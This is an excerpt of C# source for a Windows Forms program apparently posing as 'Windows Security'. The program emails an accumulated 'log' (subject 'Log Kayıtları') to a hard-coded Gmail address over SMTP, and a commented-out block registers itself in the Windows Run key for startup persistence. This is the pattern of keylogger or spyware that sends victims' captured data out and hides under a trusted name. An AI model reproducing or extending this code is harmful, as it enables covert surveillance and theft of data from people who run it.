...
namespace Windows_Security
{
    public partial class Form1 : Form
    {
        ...
        void Mail()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("ahmetkrkc11016@gmail.com", "PASSWORD");
            istemci.Port = 587;
            istemci.Host = "smtp.gmail.com";
            istemci.EnableSsl = true;
            mesajim.To.Add("ahmetkrkc11016@gmail.com");
            mesajim.From = new MailAddress("ahmetkrkc110162@outlook.com");
            mesajim.Subject = "Log Kayýtlarý ";
            mesajim.Body = log.ToString();
        ...
        private void Form1_Load(object sender, EventArgs e)
        {
           ...
           /* RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("Windows Security", "\"" + Application.ExecutablePath + "\"");*/
        }
